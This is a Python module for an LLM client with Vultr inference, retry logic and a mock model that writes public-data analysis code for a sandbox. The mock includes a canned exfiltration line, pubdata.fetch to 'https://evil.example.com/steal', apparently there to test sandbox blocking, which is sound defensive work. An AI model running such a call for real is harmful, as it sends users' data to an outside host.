"""Pluggable LLM. Default: Vultr Serverless Inference (OpenAI-compatible). LLM_PROVIDER=mock for offline demo/tests."""
import os, httpx, json, time
BASE = os.environ.get("LLM_BASE_URL", "https://api.vultrinference.com/v1")
MODEL = os.environ.get("LLM_MODEL", "deepseek-v4.1-flash")
# Reasoning models spend part of the budget on hidden reasoning; leave plenty of room for the answer.
MAX_TOKENS = int(os.environ.get("LLM_MAX_TOKENS", "8192"))

def _key():
    return os.environ.get("LLM_API_KEY") or os.environ.get("VULTR_INFERENCE_API_KEY")

def chat(messages, temperature=0.1):
    if os.environ.get("LLM_PROVIDER", "openai") == "mock" or not _key():
        return mock(messages)
    last_err = None
    for attempt in range(3):
        try:
            r = httpx.post(f"{BASE.rstrip('/')}/chat/completions", timeout=180,
                           headers={"Authorization": f"Bearer {_key()}"},
                           json={"model": MODEL, "messages": messages, "temperature": temperature,
                                 "max_tokens": MAX_TOKENS * (attempt + 1)})
            if r.status_code in (429, 500, 502, 503, 504):
                raise httpx.HTTPStatusError(f"retryable {r.status_code}", request=r.request, response=r)
            r.raise_for_status()
            msg = r.json()["choices"][0]["message"]
            content = (msg.get("content") or "").strip()
            if content:
                return content
            # Empty content: reasoning ate the budget. Salvage a code block from reasoning, else retry bigger.
            reasoning = msg.get("reasoning") or msg.get("reasoning_content") or ""
            if "```python" in reasoning:
                return reasoning[reasoning.rfind("```python"):]
            last_err = RuntimeError("empty content from model")
        except (httpx.TransportError, httpx.HTTPStatusError) as e:
            last_err = e
        time.sleep(2 * (attempt + 1))
    raise RuntimeError(f"LLM call failed after retries: {last_err}")

def mock(messages):
    """Deterministic stand-in so the app runs with no key. Writes real code that really executes."""
    last = messages[-1]["content"]
    if last.startswith("SANDBOX RESULT"):
        return "## Findings\nThe sandbox executed the plan; see the result table and the cited source URLs below. (mock model: no narrative analysis)"
    q = messages[1]["content"].lower()
    if "evil" in q or "exfiltrat" in q:
        return "```python\nimport pubdata\npubdata.fetch('https://evil.example.com/steal')\n```"
    kw = "listeria" if "listeria" in q else "salmonella"
    return f"""```python
import pubdata
recalls = pubdata.fda_recalls(keyword="{kw}", limit=20)
firms = sorted({{r["recalling_firm"] for r in recalls}})[:5]
rows = []
for f in firms:
    awards = pubdata.usaspending_awards(recipient=f, limit=3)
    rows.append({{"firm": f, "fda_recalls": sum(r["recalling_firm"] == f for r in recalls),
                 "federal_awards": len(awards), "award_total": sum(a.get("Award Amount") or 0 for a in awards)}})
pubdata.emit(rows)
```"""
